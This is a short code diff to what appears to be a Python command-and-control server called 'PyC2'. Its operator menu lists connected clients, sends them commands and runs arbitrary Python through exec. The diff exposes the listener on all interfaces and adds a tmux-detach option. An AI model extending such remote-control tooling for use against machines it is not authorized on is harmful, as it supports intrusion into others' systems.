@@ -7,9 +7,10 @@ from datetime import datetime
 import requests
 from cryptography.fernet import Fernet
 import base64
+import subprocess
 #import copy
 
-HOST='localhost'
+HOST='0.0.0.0'
 LISTEN_PORT=9999
 BUFFER_SIZE=4096
 TIMEOUT_TIME=10
@@ -212,7 +213,7 @@ def command_menu():
     #for line in [f"\n\t************************************************",f"\t********************{style.GREEN} PyC2 {style.RESET}********************","\t************************************************"]:
     #    print(line)
     print("\nEnter Selection:")
-    for line in ["1 - List connected clients","2 - Ping Check","3 - Kill a client","4 - Send Command","5 - Custom Python Command","6 - Exit"]: #,"4 - Exit"
+    for line in ["1 - List connected clients","2 - Ping Check","3 - Kill a client","4 - Send Command","5 - Custom Python Command","6 - Tmux Detach","7 - Exit"]: #,"4 - Exit"
         print("\t"+line)
 
     response = input(f"{style.BLUE}Please enter a number: {style.RESET}").strip()
@@ -311,8 +312,11 @@ def command_menu():
                 exec(user_input)
         except Exception as e:
             print(f"Error: {str(e)}")
+
+    elif response == "6":
+        subprocess.run("tmux detach", shell=True)
     
-    elif response == "6": # Exit
+    elif response == "7": # Exit
         confirm = input(f"{style.RED}Are you sure you want to exit? This will kill the server. Type y/n: {style.RESET}").strip()
         if confirm == "y":
             exit()
